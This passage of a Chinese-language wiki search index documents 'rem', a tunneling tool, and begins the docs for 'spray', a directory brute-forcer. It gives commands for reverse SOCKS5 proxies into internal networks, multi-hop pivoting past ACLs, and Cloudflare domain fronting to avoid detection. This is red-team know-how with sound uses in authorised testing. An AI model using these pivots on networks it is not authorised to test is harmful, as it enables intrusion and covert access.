<pre><code>./rem -c [link] -d internal\n</code></pre> <p>\u5c06\u5728B \u76d1\u542csocks5\u7aef\u53e3\uff0c \u901a\u8fc7\u8be5\u7aef\u53e3\u53ef\u4ee5\u76f4\u63a5\u8bbf\u95ee\u5230A\u6240\u5728\u7684\u5185\u7f51</p> <pre><code>./rem -c [link] -d internal -m proxy\n</code></pre> <p>\u5c06 B \u7684 12345 \u7aef\u53e3\u8f6c\u53d1\u5230 A \u7684\u968f\u673a\u751f\u6210\u7684\u7aef\u53e3 <pre><code>./rem -c [link] -d internal -l port://:12345\n</code></pre></p> <p>\u5c06\u4f1a\u5c06 A \u7684 8888 \u7aef\u53e3\u8f6c\u53d1\u5230 B \u7684\u968f\u673a\u751f\u6210\u7684\u7aef\u53e3 <pre><code>./rem -c [link]  -d internal -r :1234 -m proxy\n</code></pre></p>"},{"location":"rem/usage/#\u573a\u666f2-\u7ea7\u8054","title":"\u573a\u666f2 \u7ea7\u8054","text":"<p>\u5047\u8bbe\u6709\u5185\u7f51\u670d\u52a1\u5668A\uff0c\u53ef\u51fa\u7f51\uff0c \u80fd\u8bbf\u95ee\u5230\u516c\u7f51\u670d\u52a1\u5668C\uff1b \u6709\u5185\u7f51\u670d\u52a1\u5668B\uff0c \u53ef\u4ee5\u8bbf\u95ee\u5230\u5185\u7f51\u670d\u52a1\u5668A\uff0c\u4f46\u4e0d\u51fa\u7f51\u8bbf\u95ee\u4e0d\u5230\u516c\u7f51\u670d\u52a1\u5668C</p> <p>\u5982\u679c\u60f3\u642d\u5efa\u4e00\u4e2a\u591a\u7ea7\u7684\u4ee3\u7406\uff0c \u8ba9C\u670d\u52a1\u5668\u4e0a\u642d\u5efa\u7684socks5\u670d\u52a1\u80fd\u76f4\u901a\u6700\u5185\u5c42\u7684\u670d\u52a1\u5668B\u3002 \u53ef\u4ee5\u6309\u7167\u5982\u4e0b\u64cd\u4f5c</p> <p>\u670d\u52a1\u5668C \u542f\u52a8 rem</p> <pre><code>./rem\n</code></pre> <p>\u670d\u52a1\u5668A\u4e0a\u542f\u52a8\u7aef\u53e3\u8f6c\u53d1, \u5c06C\u4e0a\u7684rem console\u7684\u7aef\u53e3\u8f6c\u53d1\u5230\u672c\u5730\u76841234\u7aef\u53e3</p> <pre><code>./rem -c [link] -m proxy -r raw://:34996 -l port://:1234\n</code></pre> <p>\u5728\u670d\u52a1\u5668B\u4e0a\u642d\u5efa\u7ea7\u8054\u7684\u53cd\u5411\u4ee3\u7406</p> <p>\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c rem\u7684console\u7684\u7aef\u53e3\u5df2\u7ecf\u88ab\u8f6c\u53d1\u5230A\u4e0a\uff0c \u6240\u4ee5**\u9700\u8981\u4fee\u6539address\u4e3aA\u4e0a\u8f6c\u53d1\u540e\u7684\u7aef\u53e3\uff0c \u5176\u4ed6\u53c2\u6570\u4fdd\u6301\u4e0d\u53d8**</p> <pre><code>./rem -c tcp://[A ip]:[port]/?wrapper=.......\n</code></pre> <p>\u573a\u666f2\u4ec5\u652f\u6301\u670d\u52a1\u5668B\u80fd\u8bbf\u95ee\u5230\u670d\u52a1\u5668A\u7684\u60c5\u51b5\u4e0b</p> <p>\u5982\u679c\u662f\u670d\u52a1\u5668A\u80fd\u8bbf\u95ee\u5230\u66f4\u5185\u5c42\u670d\u52a1\u5668B\uff0c \u800cB\u65e0\u6cd5\u8bbf\u95ee\u5230\u4f4d\u4e8e\u7f51\u7edc\u8fb9\u754c\u7684\u670d\u52a1\u5668A\uff0c \u53ef\u4ee5\u4f7f\u7528\u53e6\u4e00\u79cd\u65b9\u5f0f</p>"},{"location":"rem/usage/#\u573a\u666f3-\u5185\u7f51\u5355\u5411\u8fde\u901a\u7684\u7ea7\u8054","title":"\u573a\u666f3 \u5185\u7f51\u5355\u5411\u8fde\u901a\u7684\u7ea7\u8054","text":"<p>\u5047\u8bbe\u6709\u5185\u7f51\u670d\u52a1\u5668A\uff0c\u53ef\u51fa\u7f51\uff0c \u80fd\u8bbf\u95ee\u5230\u516c\u7f51\u670d\u52a1\u5668C\uff1b \u6709\u5185\u7f51\u670d\u52a1\u5668B\uff0c \u53ef\u4ee5\u8bbf\u95ee\u5230\u5185\u7f51\u670d\u52a1\u5668A\uff0c\u4f46\u4e0d\u51fa\u7f51\u8bbf\u95ee\u4e0d\u5230\u516c\u7f51\u670d\u52a1\u5668C\u3002 \u670d\u52a1\u5668A\u80fd\u8bbf\u95ee\u5230\u66f4\u5185\u5c42\u670d\u52a1\u5668B\uff0c \u800cB\u65e0\u6cd5\u8bbf\u95ee\u5230\u4f4d\u4e8e\u7f51\u7edc\u8fb9\u754c\u7684\u670d\u52a1\u5668A</p> <p>\u6b64\u601d\u8def\u4e5f\u7528\u4e8e\u590d\u73b0\u5df2\u5b58\u5728\u7684\u8de8ACL\u4ee3\u7406\u5b9e\u73b0\u7ea7\u8054</p> <p>\u670d\u52a1\u5668C \u542f\u52a8 rem</p> <pre><code>./rem\n</code></pre> <p>\u670d\u52a1\u5668B\u542f\u52a8 socks5\u4ee3\u7406</p> <pre><code>./rem -m bind  -l socks5://:12345\n</code></pre> <p>\u670d\u52a1\u5668A\u901a\u8fc7outbound proxy \u5b9e\u73b0\u7ea7\u8054</p> <pre><code>./rem -c [link] -f socks5://remno1:0onmer@[B]:12345\n</code></pre> <p>\u670d\u52a1\u5668A\u4e0e\u670d\u52a1\u5668B\u7684\u901a\u8baf\u4e3a\u660e\u6587\u7684socks5</p> <p>\u53ef\u80fd\u5b58\u5728\u88ab\u68c0\u6d4b\u7684\u98ce\u9669\u3002\u53ef\u4ee5\u901a\u8fc7rem\u4ee3\u66ffsocks\u4f5c\u4e3a\u4ee3\u7406\u670d\u52a1\u5668</p>"},{"location":"rem/usage/#\u7279\u6b8a\u573a\u666f","title":"\u7279\u6b8a\u573a\u666f","text":""},{"location":"rem/usage/#\u57df\u524d\u7f6e","title":"\u57df\u524d\u7f6e","text":"<p>\u57df\u524d\u7f6e\u9700\u8981\u4f9d\u8d56\u963f\u91cc\u4e91\u3001\u817e\u8baf\u4e91\u3001cloudflare\u7b49\u4e91\u670d\u52a1\u63d0\u4f9b\u5546\u3002 \u672c\u8d28\u4e0a\u5e76\u65e0\u4e0d\u540c\uff0c \u6211\u4ee5cloudflare\u4e3e\u4f8b\u3002</p> <p>\u914d\u7f6ecloudflare</p> <p>\u6dfb\u52a0\u4e00\u4e2a\u57df\u540d\u540e\uff0c \u6dfb\u52a0\u4e00\u4e2a\u793a\u4f8b\u7684\u5b50\u57df\u540d <code>rem</code> , IP \u4e3arem \u5b9e\u9645\u90e8\u7f72\u7684\u670d\u52a1\u5668IP\u3002</p> <p></p> <p>\u6253\u5f00rem\u670d\u52a1</p> <p>\u56e0\u4e3arem\u7684http\u662f\u534a\u53cc\u5de5\u6a21\u62df\u7684\u53cc\u5de5\u4fe1\u9053\uff0c \u5b58\u5728\u6027\u80fd\u4e0a\u7684\u95ee\u9898\u3002 \u6211\u4eec\u53ef\u4ee5\u4f7f\u7528websocket\u4f5c\u4e3a\u66f4\u52a0\u9ad8\u6548\u800c\u7a33\u5b9a\u7684\u53cc\u5de5\u4fe1\u9053\u3002 </p> <p>rem\u9ed8\u8ba4release\u4e2d\u4e0d\u5305\u542bwebsocket\u4fe1\u9053\uff0c \u9700\u8981\u81ea\u884c\u7f16\u8bd1</p> <p>\u53ef\u53c2\u8003\u7f16\u8bd1\u6587\u6863</p> <p><code>sh build.sh -t websocket</code> </p> <p> \u914d\u7f6enginx</p> <p>\u6211\u4eec\u901a\u8fc7nginx\u53cd\u5411\u4ee3\u7406\u7ba1\u7406\u76f8\u5173\u7684rem\u7684\u5b9e\u9645\u670d\u52a1\u3002</p> <pre><code>server {\n    listen 8080;\n\n    # \u5339\u914d\u6240\u6709\u8def\u5f84\uff0c\u5168\u90e8\u4ee3\u7406\u5230 WebSocket\n    location / {\n        proxy_pass http://127.0.0.1:12355;  # \u540e\u7aef WebSocket \u670d\u52a1\u5730\u5740\n        proxy_http_version 1.1;\n        proxy_set_header Upgrade $http_upgrade;\n        proxy_set_header Connection \"upgrade\";\n        proxy_set_header Host $host;\n\n        # \u957f\u8fde\u63a5\u8d85\u65f6\u8bbe\u7f6e\n        proxy_read_timeout 3600s;\n        proxy_send_timeout 3600s;\n    }\n}\n</code></pre> <p>cloudflare\u9ed8\u8ba4\u7684\u4ee3\u7406\u7aef\u53e3</p> <ul> <li>80</li> <li>443</li> <li>8080</li> <li>8443</li> <li>...</li> </ul> <p>\u5ba2\u6237\u7aef\u8fde\u63a5</p> <p>\u5ba2\u6237\u7aef\u4fee\u6539host\u4e3a\u57df\u540d\uff0cport\u4e3anginx\u4e0a\u8bbe\u7f6e\u7684\u7aef\u53e3</p> <p></p> <p>\u56fd\u5185\u4e91\u670d\u52a1\u5668\u6ce8\u610f\u5907\u6848\u95ee\u9898</p> <p>\u56fd\u5185\u4e91\u670d\u52a1\u5546\u4f1a\u68c0\u6d4bcloudflare\u7684\u5165\u7ad9\u6d41\u91cf\u3002 \u5f3a\u5236\u8981\u6c42\u57df\u540d\u5907\u6848 </p>"},{"location":"rem/usage/#\u5185\u7f51\u4ee3\u7406\u51fa\u7f51","title":"\u5185\u7f51\u4ee3\u7406\u51fa\u7f51","text":""},{"location":"rem/usage/#\u767d\u540d\u5355host\u51fa\u7f51","title":"\u767d\u540d\u5355HOST\u51fa\u7f51","text":""},{"location":"rem/usage/#\u7279\u5b9a\u4e1a\u52a1\u51fa\u7f51","title":"\u7279\u5b9a\u4e1a\u52a1\u51fa\u7f51","text":""},{"location":"rem/usage/#clash\u8ba2\u9605","title":"Clash\u8ba2\u9605","text":"<p>\u9ed8\u8ba4\u60c5\u51b5\u4e0b, \u4f1a\u81ea\u52a8\u81ea\u52a8\u6253\u5f00clash\u8ba2\u9605\u670d\u52a1\u3002 </p> <p></p> <p>\u81ea\u52a8\u6839\u636e\u5e38\u89c1\u5185\u7f51\u751f\u6210\u914d\u7f6e</p> <pre><code>proxies:\n    - name: Sangfor-c0e9550e127fd067\n      type: socks5\n      server: 127.0.0.1\n      port: 10086\n      udp: true\n      tls: false\n      skip-cert-verify: true\nmode: rule\nrules:\n    - IP-CIDR,10.0.0.0/8,10_NET\n    - IP-CIDR,172.16.0.0/12,172_NET\n    - IP-CIDR,192.168.0.0/16,192_NET\n    - IP-CIDR,10.0.0.1/24,LOCAL_NET\n    - MATCH,DIRECT\nproxy-groups:\n    - name: 10_NET\n      type: select\n      proxies:\n        - Sangfor-c0e9550e127fd067\n        - DIRECT\n    - name: 172_NET\n      type: select\n      proxies:\n        - Sangfor-c0e9550e127fd067\n        - DIRECT\n    - name: 192_NET\n      type: select\n      proxies:\n        - Sangfor-c0e9550e127fd067\n        - DIRECT\n    - name: LOCAL_NET\n      type: select\n      proxies:\n        - Sangfor-c0e9550e127fd067\n        - DIRECT\n</code></pre> <p>\u53ef\u4ee5\u901a\u8fc7<code>-sub http://0.0.0.0:12345/abcd</code> \u6307\u5b9aclash\u8ba2\u9605\u94fe\u63a5</p> <p>\u53ef\u4ee5\u901a\u8fc7 <code>--no-sub</code> \u5173\u95edclash\u8ba2\u9605</p>"},{"location":"rem/usage/#build","title":"Build","text":"<p>rem \u63d0\u4f9b\u4e86\u7075\u6d3b\u7684\u6784\u5efa\u7cfb\u7edf\uff0c\u652f\u6301\u591a\u79cd\u6784\u5efa\u6a21\u5f0f\u548c\u76ee\u6807\u5e73\u53f0\u3002  </p>"},{"location":"rem/usage/#\u5feb\u901f\u5f00\u59cb","title":"\u5feb\u901f\u5f00\u59cb","text":"<pre><code># \u7f16\u8bd1\u9ed8\u8ba4\u7248\u672c\uff08\u57fa\u7840\u6a21\u5757\uff0c\u591a\u5e73\u53f0\uff09  \n./build.sh  \n\n# \u7f16\u8bd1\u5b8c\u6574\u7248\u672c\uff08\u5305\u542b\u6240\u6709\u6a21\u5757\uff0c\u591a\u5e73\u53f0\uff09  \n./build.sh --full  \n\n# \u7f16\u8bd1\u81ea\u5b9a\u4e49\u5e73\u53f0\u7248\u672c  \n./build.sh --full -o \"windows/amd64,linux/amd64,darwin/amd64\"  \n</code></pre>"},{"location":"rem/usage/#\u6784\u5efa\u53c2\u6570","title":"\u6784\u5efa\u53c2\u6570","text":""},{"location":"rem/usage/#\u57fa\u7840\u53c2\u6570","title":"\u57fa\u7840\u53c2\u6570","text":"<ul> <li><code>-m MOD</code>: \u8bbe\u7f6e\u9ed8\u8ba4\u6a21\u5f0f  </li> <li><code>-c CONSOLE</code>: \u8bbe\u7f6e\u9ed8\u8ba4\u63a7\u5236\u53f0\u5730\u5740  </li> <li><code>-l LOCAL</code>: \u8bbe\u7f6e\u9ed8\u8ba4\u672c\u5730\u5730\u5740  </li> <li><code>-r REMOTE</code>: \u8bbe\u7f6e\u9ed8\u8ba4\u8fdc\u7a0b\u5730\u5740  </li> <li><code>-o OSARCH</code>: \u6307\u5b9a\u76ee\u6807\u5e73\u53f0\uff0c\u683c\u5f0f\uff1a<code>os/arch</code>\uff0c\u591a\u4e2a\u5e73\u53f0\u7528\u9017\u53f7\u5206\u9694\uff08\u9ed8\u8ba4\uff1a<code>windows/amd64,windows/386,linux/amd64,linux/arm64,darwin/amd64,darwin/arm64</code>\uff09  </li> <li><code>-a APPLICATION</code>: \u6307\u5b9a\u5e94\u7528\u6a21\u5757\uff0c\u591a\u4e2a\u6a21\u5757\u7528\u9017\u53f7\u5206\u9694  </li> <li><code>-t TRANSPORT</code>: \u6307\u5b9a\u4f20\u8f93\u6a21\u5757\uff0c\u591a\u4e2a\u6a21\u5757\u7528\u9017\u53f7\u5206\u9694  </li> <li><code>-g</code>: \u53ea\u751f\u6210\u914d\u7f6e\u6587\u4ef6\uff0c\u4e0d\u8fdb\u884c\u7f16\u8bd1  </li> <li><code>--full</code>: \u4f7f\u7528\u5b8c\u6574\u6a21\u5757\u914d\u7f6e  </li> <li><code>-buildmode MODE</code>: \u6307\u5b9a\u6784\u5efa\u6a21\u5f0f  </li> <li><code>-h, --help</code>: \u663e\u793a\u5e2e\u52a9\u4fe1\u606f  </li> </ul>"},{"location":"rem/usage/#\u6784\u5efa\u6a21\u5f0f","title":"\u6784\u5efa\u6a21\u5f0f","text":"<ul> <li><code>exe</code>: \u9ed8\u8ba4\u53ef\u6267\u884c\u6587\u4ef6\uff08\u4f7f\u7528 gox \u8fdb\u884c\u4ea4\u53c9\u7f16\u8bd1\uff0cCGO_ENABLED=0\uff09  </li> <li><code>c-shared</code>: \u52a8\u6001\u94fe\u63a5\u5e93\uff08.dll/.so\uff0cCGO_ENABLED=1\uff09  </li> <li><code>c-archive</code>: \u9759\u6001\u94fe\u63a5\u5e93\uff08.a\uff0cCGO_ENABLED=1\uff09  </li> </ul>"},{"location":"rem/usage/#\u6a21\u5757\u914d\u7f6e","title":"\u6a21\u5757\u914d\u7f6e","text":""},{"location":"rem/usage/#\u9ed8\u8ba4\u6a21\u5757","title":"\u9ed8\u8ba4\u6a21\u5757","text":"<ul> <li>\u5e94\u7528\u6a21\u5757: <code>http,raw,socks,portforward</code> </li> <li>\u4f20\u8f93\u6a21\u5757: <code>tcp,udp</code> </li> </ul>"},{"location":"rem/usage/#\u5b8c\u6574\u6a21\u5757-full","title":"\u5b8c\u6574\u6a21\u5757\uff08--full\uff09","text":"<ul> <li>\u5e94\u7528\u6a21\u5757: <code>http,raw,socks,portforward,shadowsocks,trojan</code> </li> <li>\u4f20\u8f93\u6a21\u5757: <code>tcp,udp,websocket,unix,icmp,http,memory</code> </li> </ul>"},{"location":"rem/usage/#\u4f7f\u7528\u573a\u666f","title":"\u4f7f\u7528\u573a\u666f","text":""},{"location":"rem/usage/#\u9ed8\u8ba4\u6a21\u5f0f","title":"\u9ed8\u8ba4\u6a21\u5f0f","text":"<pre><code># \u7f16\u8bd1\u591a\u5e73\u53f0\u7248\u672c\u7528\u4e8e\u5f00\u53d1\u8c03\u8bd5  \n./build.sh  \n\n# \u53ea\u751f\u6210\u914d\u7f6e\u6587\u4ef6\uff0c\u68c0\u67e5\u6a21\u5757\u914d\u7f6e  \n./build.sh --full -g  \n</code></pre>"},{"location":"rem/usage/#\u5b8c\u6574\u6a21\u5f0f","title":"\u5b8c\u6574\u6a21\u5f0f","text":"<pre><code># \u7f16\u8bd1\u751f\u4ea7\u7248\u672c\uff08\u5b8c\u6574\u529f\u80fd\uff0c\u9ed8\u8ba4\u591a\u5e73\u53f0\uff09  \n./build.sh --full  \n\n# \u7f16\u8bd1\u81ea\u5b9a\u4e49\u5e73\u53f0\u751f\u4ea7\u7248\u672c  \n./build.sh --full -o \"windows/amd64,linux/amd64,darwin/amd64\"  \n</code></pre>"},{"location":"rem/usage/#\u81ea\u5b9a\u4e49\u6a21\u5757","title":"\u81ea\u5b9a\u4e49\u6a21\u5757","text":"<pre><code># \u53ea\u7f16\u8bd1 HTTP \u548c SOCKS \u4ee3\u7406\u529f\u80fd  \n./build.sh -a \"http,socks\" -t \"tcp,websocket\"  \n\n# \u7f16\u8bd1\u7279\u5b9a\u5e73\u53f0\u7684\u81ea\u5b9a\u4e49\u7248\u672c  \n./build.sh -a \"http,socks\" -t \"tcp,udp\" -o \"linux/amd64\"  \n</code></pre>"},{"location":"rem/usage/#\u5e93\u6587\u4ef6\u7f16\u8bd1","title":"\u5e93\u6587\u4ef6\u7f16\u8bd1","text":"<pre><code># \u7f16\u8bd1\u52a8\u6001\u94fe\u63a5\u5e93  \n./build.sh --full -buildmode c-shared -o \"windows/amd64,linux/amd64\"  \n# \u8f93\u51fa: dist/lib/rem_community_windows_amd64.dll, dist/lib/rem_community_linux_amd64.so  \n\n# \u7f16\u8bd1\u9759\u6001\u94fe\u63a5\u5e93  \n./build.sh --full -buildmode c-archive -o \"windows/amd64,linux/amd64\"  \n# \u8f93\u51fa: dist/lib/librem_community_windows_amd64.a, dist/lib/librem_community_linux_amd64.a  \n\n# \u7f16\u8bd1\u672c\u5730\u5e73\u53f0\u5e93\u6587\u4ef6  \n./build.sh --full -buildmode c-shared  \n# \u8f93\u51fa: dist/lib/rem_community_&lt;local_os&gt;_&lt;local_arch&gt;.&lt;ext&gt;  \n</code></pre>"},{"location":"spray/","title":"spray \u00b7 index","text":""},{"location":"spray/#overview","title":"overview","text":"<p>\u5168\u65b0\u7406\u89e3\u7684\u4e0b\u4e00\u4ee3\u76ee\u5f55\u7206\u7834\u5de5\u5177, \u4e00\u4e2a\u5168\u65b9\u4f4d\u7684\u76ee\u5f55\u7206\u7834\u7684\u89e3\u51b3\u65b9\u6848</p> <p>repo: https://github.com/chainreactors/spray</p> <p>release: https://github.com/chainreactors/spray/releases/latest</p> <p>\u5feb\u901f\u5165\u95e8: https://chainreactors.github.io/wiki/spray/start/</p> <p>spray\u4e3b\u8981\u4e3a\u4e86\u89e3\u51b3\u81ea\u52a8\u6709\u6548\u76ee\u5f55\u8bc6\u522b, \u6781\u9650\u6027\u80fd, \u591a\u76ee\u6807\u4ee5\u53ca\u5206\u5e03\u5f0f\u76ee\u5f55\u7206\u7834\u4e2d\u53ef\u80fd\u4f1a\u9047\u5230\u7684\u95ee\u9898. \u5e76\u4e3a\u89e3\u51b3\u8fd9\u4e9b\u95ee\u9898\u4fdd\u7559\u4e86\u53ca\u5176\u4e30\u5bcc\u7684\u62d3\u5c55\u80fd\u529b. \u63d0\u4f9b\u4e86\u4e00\u7ad9\u5f0f\u7684\u76ee\u5f55\u7206\u7834/\u4fe1\u606f\u6536\u96c6\u89e3\u51b3\u65b9\u6848. </p> <p>spray = [feroxbuster(\u9ad8\u6027\u80fd\u76ee\u5f55\u7206\u7834)] + [\u6307\u7eb9\u8bc6\u522b] + [httpx(http\u57fa\u672c\u4fe1\u606f\u89e3\u6790)] + [dirmap(\u5b57\u5178\u751f\u6210)] + \u81ea\u5e26\u7684\u5927\u91cf\u76ee\u5f55\u7206\u7834\u76f8\u5173\u529f\u80fd </p> <p>\u8bbe\u8ba1\u7406\u5ff5</p> <p>\u5c3d\u53ef\u80fd\u628a\u80fd\u81ea\u52a8\u5316\u7684\u5de5\u4f5c\u90fd\u4ea4\u7ed9\u5de5\u5177, \u4f46\u4e3a\u6240\u6709\u573a\u666f\u4fdd\u7559\u53ef\u63a7\u5236\u7684\u63a5\u53e3. </p> <p>Features.</p> <ul> <li>\u8d85\u5f3a\u7684\u6027\u80fd, \u5728\u672c\u5730\u6d4b\u8bd5\u6781\u9650\u6027\u80fd\u7684\u573a\u666f\u4e0b, \u80fd\u8d85\u8fc7ffuf\u4e0eferoxbruster\u7684\u6027\u80fd50%\u4ee5\u4e0a. </li> <li>\u57fa\u4e8e\u63a9\u7801\u7684\u5b57\u5178\u751f\u6210</li> <li>\u57fa\u4e8e\u89c4\u5219\u7684\u5b57\u5178\u751f\u6210</li> <li>\u52a8\u6001\u667a\u80fd\u8fc7\u6ee4</li> <li>\u5168\u91cfgogo\u7684\u6307\u7eb9\u8bc6\u522b</li> <li>\u81ea\u5b9a\u4e49\u4fe1\u606f\u63d0\u53d6, \u5982ip,js, title, hash\u4ee5\u53ca\u81ea\u5b9a\u4e49\u7684\u6b63\u5219\u8868\u8fbe\u5f0f</li> <li>\u81ea\u5b9a\u4e49\u65e0\u6548\u9875\u9762\u8fc7\u6ee4\u7b56\u7565</li> <li>\u81ea\u5b9a\u4e49\u8f93\u51fa\u683c\u5f0f</li> <li>*nix\u7684\u547d\u4ee4\u884c\u8bbe\u8ba1, \u8f7b\u677e\u4e0e\u5176\u4ed6\u5de5\u5177\u8054\u52a8</li> <li>\u591a\u89d2\u5ea6\u7684\u81ea\u52a8\u88abban,\u88abwaf\u5224\u65ad</li> <li>\u65ad\u70b9\u7eed\u4f20</li> <li>\u901a\u7528\u6587\u4ef6, \u5907\u4efd\u6587\u4ef6, \u5355\u4e2a\u6587\u4ef6\u5907\u4efd, \u722c\u866b, \u4e3b\u52a8\u6307\u7eb9\u8bc6\u522b\u7684\u5b8c\u7f8e\u7ed3\u5408</li> </ul>"},{"location":"spray/concept/","title":"spray \u00b7 \u6982\u5ff5","text":""},{"location":"spray/concept/#\u667a\u80fd\u8fc7\u6ee4","title":"\u667a\u80fd\u8fc7\u6ee4","text":"<p>\u6bcf\u63a5\u6536\u5230\u4e00\u4e2a\u76ee\u6807, \u521b\u5efa\u4efb\u52a1\u5e76\u521d\u59cb\u5316, \u5728\u521d\u59cb\u5316\u9636\u6bb5, \u5b9e\u9645\u4e0a\u4f1a\u505a\u4e24\u4ef6\u4e8b. \u9996\u5148\u8bbf\u95eeindex\u9875\u9762, \u67e5\u770b\u8fde\u901a\u6027\u4ee5\u53ca\u83b7\u53d6index\u7684baseline.</p> <p>\u7136\u540e\u518d\u751f\u6210\u4e00\u4e2a\u968f\u673a\u76ee\u5f55, \u83b7\u53d6\u968f\u673a\u76ee\u5f55\u7684baseline.</p> <p>\u521d\u59cb\u5316\u5b8c\u6210\u4e4b\u540e, \u5c06\u4f1a\u4fdd\u5b58\u8fd9\u4e24\u4e2abaseline, \u8fd9\u4e24\u4e2abaseline\u662f\u540e\u7eed\u4e00\u5207\u667a\u80fd\u8fc7\u6ee4\u4e0e\u9ad8\u7ea7\u8fc7\u6ee4\u7684\u57fa\u77f3.</p>"},{"location":"spray/concept/#\u5b9e\u73b0\u903b\u8f91","title":"\u5b9e\u73b0\u903b\u8f91","text":"<p>\u667a\u80fd\u8fc7\u6ee4\u8f83\u4e3a\u590d\u6742, \u6211\u53ea\u80fd\u7b80\u5355\u63cf\u8ff0\u4e00\u4e0b\u903b\u8f91, \u5177\u4f53\u7684\u8bf7\u770b\u4ee3\u7801.</p> <p>\u667a\u80fd\u8fc7\u6ee4\u4f9d\u8d56\u4e00\u4e9b\u7ecf\u9a8c\u516c\u5f0f, \u5185\u7f6e\u7684\u7ecf\u9a8c\u516c\u5f0f\u4e3a\u6700\u5c0f\u72b6\u6001, \u53ef\u4ee5\u81ea\u884c\u901a\u8fc7\u547d\u4ee4\u884c\u8fdb\u884c\u4fee\u6539.</p> <pre><code>WhiteStatus = []int{200}\nBlackStatus = []int{400, 410}\nFuzzyStatus = []int{403, 404, 500, 501, 502, 503}\nWAFStatus   = []int{493, 418}\n</code></pre> <p>\u4fee\u6539\u5bf9\u5e94\u5217\u8868\u7684\u547d\u4ee4\u884c\u53c2\u6570\u4e3a<code>--white-status</code>, <code>--black-status</code>, <code>--fuzzy-status</code>, <code>--waf-status</code>.</p> <p>\u667a\u80fd\u8fc7\u6ee4\u5206\u4e3a\u4e09\u4e2a\u9636\u6bb5. </p> <p>\u5728\u5f00\u59cb\u4e4b\u524d, \u4f1a\u8fdb\u884c\u57fa\u7840\u4fe1\u606f\u7684\u6536\u96c6, \u4f1a\u53d1\u9001\u4e00\u4e2a\u968f\u673a\u76ee\u5f55(random_baseline)\u4e0e\u6839\u76ee\u5f55(index_baseline)\u7684\u8bf7\u6c42, \u4e0d\u8bba\u8fd9\u4e24\u4e2a\u8bf7\u6c42\u7684\u8fd4\u56de\u7ed3\u679c\u662f\u4ec0\u4e48, \u4fdd\u5b58\u8fd9\u4e24\u4e2a\u8bf7\u6c42\u7684\u8be6\u7ec6\u4fe1\u606f.</p> <p>\u6536\u96c6\u5230\u8fd9\u4e9b\u4fe1\u606f\u4e4b\u540e, \u624d\u4f1a\u5f00\u59cb\u76ee\u5f55\u7206\u7834. </p> <p>\u7b2c\u4e00\u4e2a\u9636\u6bb5\u4e3a\u9884\u8fc7\u6ee4:</p> <ol> <li>\u5982\u679c\u8bf7\u6c42\u7684\u72b6\u6001\u7801\u4e3a200, \u5219\u8df3\u8fc7\u9884\u8fc7\u6ee4.</li> <li>\u5982\u679c\u8bf7\u6c42\u7684\u72b6\u6001\u7801\u5305\u542bBlackStatus\u4e0eWAFStatus\u4e2d\u7684\u51e0\u4e2a\u72b6\u6001\u7801, \u5219\u88ab\u8fc7\u6ee4.</li> <li>\u8fc7\u6ee4\u91cd\u590d30x\u8bf7\u6c42, redirect\u7684\u76ee\u7684\u5730\u4e0erandom_baseline\u7684redirect\u76f8\u540c, \u5219\u88ab\u8fc7\u6ee4</li> <li>\u5982\u679c\u8bf7\u6c42\u7684\u72b6\u6001\u7801\u4e0erandom_baseline\u7684\u72b6\u6001\u7801\u76f8\u540c, \u5219\u88ab\u8fc7\u6ee4</li> </ol> <p>\u9884\u8fc7\u6ee4\u4e3b\u8981\u4e3a\u4e86\u63d0\u9ad8\u6027\u80fd, \u7b2c\u4e8c\u4e0e\u7b2c\u4e09\u9636\u6bb5\u4f1a\u7528\u5230\u5927\u91cf\u6b63\u5219\u5339\u914d, hash\u8ba1\u7b97\u4e4b\u7c7b\u7684\u64cd\u4f5c. \u5728TPS\u8fbe\u5230\u51e0\u5343\u51e0\u4e07\u7684\u65f6\u5019\u5bfc\u81f4CPU\u5360\u7528\u8fc7\u9ad8.  \u5fc5\u9700\u5728\u8fdb\u884c\u590d\u6742\u5904\u7406\u4e4b\u524d, \u5c06\u4e00\u4e9b\u5fc5\u5b9a\u65e0\u6548\u7684\u6570\u636e\u8fc7\u6ee4\u6389.</p> <p>\u88ab\u8fc7\u6ee4\u7684\u7ed3\u679c\u53ef\u4ee5\u4f7f\u7528<code>--debug</code>\u67e5\u770b, \u5176\u4e2d\u7684reason\u5b57\u6bb5\u8868\u793a\u88ab\u8fc7\u6ee4\u7684\u539f\u56e0, \u53ef\u4ee5\u5e2e\u52a9\u4eba\u5de5\u8c03\u6574\u8fc7\u6ee4\u7b56\u7565.</p> <p>\u7b2c\u4e8c\u9636\u6bb5\u4e3a\u6807\u51c6\u8fc7\u6ee4:</p> <p>\u901a\u8fc7\u9884\u8fc7\u6ee4\u7684\u8bf7\u6c42\u4f1a\u6267\u884c\u4e00\u6b21\u8be6\u7ec6\u7684\u4fe1\u606f\u6536\u96c6, \u5305\u62ec\u88ab\u52a8\u6307\u7eb9\u8bc6\u522b, hash\u8ba1\u7b97\u7b49\u5de5\u4f5c.</p> <ol> <li>\u5982\u679c\u662fFuzzyStatus\u4e2d\u7684\u51e0\u4e2a\u72b6\u6001\u7801, \u7b2c\u4e00\u6b21\u51fa\u73b0\u8be5\u72b6\u6001\u7801\u5c06\u4f1a\u88ab\u6dfb\u52a0\u5230baseline\u5217\u8868\u4e2d, \u7528\u6765\u7ed9\u4e4b\u540e\u7684\u76f8\u540c\u72b6\u6001\u7801\u5f53\u4f5cbaseline.</li> <li>\u9009\u62e9\u5bf9\u5e94\u72b6\u6001\u7801\u7684baseline, \u5982\u679c\u4e0d\u5b58\u5728\u5219\u4f7f\u7528index_baseline</li> <li>\u6839\u636e\u7684\u9875\u9762\u7684body\u957f\u5ea6\u7edd\u5bf9\u503c\u5c0f\u4e8epath\u4e0eMD5\u503c\u8fdb\u884c\u5bf9\u6bd4, \u5982\u679c\u5747\u4e0d\u540c\u5219\u8fdb\u5165\u52304\u4e2d</li> <li>\u5224\u65ad\u9875\u9762\u4e2d\u662f\u5426\u5b58\u5728path, \u5f88\u591a\u60c5\u51b5\u4e0b, \u8f93\u5165\u7684path\u4f1a\u88ab\u91cd\u65b0\u62fc\u63a5\u5230body\u4e2d. \u5982\u679c\u5b58\u5728path\u5219\u8ba4\u4e3a\u662f\u65e0\u6548\u6570\u636e.</li> </ol> <p>\u5982\u679c\u901a\u8fc7\u4e86\u4e0a\u9762\u8fd9\u51e0\u4e2a\u6b65\u9aa4, \u5219\u8fdb\u5165\u4e0b\u4e00\u6b65.</p> <p>\u7b2c\u4e09\u9636\u6bb5\u4e3a\u6a21\u7cca\u8fc7\u6ee4, \u8fd9\u4e00\u9636\u6bb5\u8fd8\u5728\u63a2\u7d22\u4e2d, 